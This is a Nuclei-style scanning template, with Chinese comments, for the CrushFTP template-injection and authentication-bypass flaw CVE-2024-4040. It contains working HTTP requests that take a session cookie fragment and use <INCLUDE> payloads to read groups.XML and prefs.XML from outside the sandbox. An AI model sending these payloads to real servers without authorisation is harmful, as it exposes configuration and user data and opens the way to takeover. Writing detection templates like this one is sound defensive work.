id: CVE-2024-4040 # 

info:
  name: CrushFTP 认证绕过模板注入漏洞（CVE-2024-4040） # 必填，漏洞名
  author: k3ppf0r # 必填，作者
  severity: critical # 必填，严重程度，critical, high, medium, low, info
  description: |
    所有平台上 10.7.1 和 11.1.0 之前的所有版本中的 CrushFTP 中的服务器端模板注入漏洞允许未经身份验证的远程攻击者从 VFS 沙箱外部的文件系统读取文件，绕过身份验证以获得管理访问权限，并在服务器。
  reference:
    - https://github.com/airbus-cert/CVE-2024-4040
    - https://www.bleepingcomputer.com/news/security/crushftp-warns-users-to-patch-exploited-zero-day-immediately/
    - https://www.crushftp.com/crush10wiki/Wiki.jsp?page=更新
  remediation: |
    升级至最新版本
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-4040 
    cwe-id: CWE-1336
    # cpe: # 可选：cpe:2.3:a:vmware:spring_cloud_function:*:*:*:*:*:*:*:*
  metadata:
    date: 2024-04-22 # 必填，纰漏时间，例：2019-09-22
    version: versions before 10.7.1 and 11.1.0 
    xxx-query: # 可选
  tags: cve,cve2024,CrushFTP

flow: http(1) && http(2) 

http:
  - raw:
      - |+
        GET //WebInterface/ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate, br
        Accept: */*
        Connection: close

    cookie-reuse: true
    extractors:
      - type: regex
        name: crushauth_four
        part: header
        internal: true
        regex:
          - "Set-Cookie: CrushAuth=.*(.{4}); path"
        group: 1

  - raw:
      - |-
        POST //WebInterface/function/ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.31.0
        Accept-Encoding: gzip, deflate, br
        Accept: */*
        Connection: close
        user_ip: 127.0.0.1
        Content-Length: 116
        Content-Type: application/x-www-form-urlencoded

        command=exists&random=0.34712915617878926&paths=%3CINCLUDE%3Eusers%2FMainUsers%2Fgroups.XML%3C%2FINCLUDE%3E&c2f={{crushauth_four}}

      - |-
        POST //WebInterface/function/ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate, br
        Accept: */*
        Connection: close
        user_ip: 127.0.0.1
        Content-Length: 95
        Content-Type: application/x-www-form-urlencoded

        command=exists&random=0.34712915617878926&paths=%3CINCLUDE%3Eprefs.XML%3C%2FINCLUDE%3E&c2f={{crushauth_four}}

    
    matchers-condition: or
    # matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<groups'

      - type: word
        part: body
        words:
          - '<server_prefs'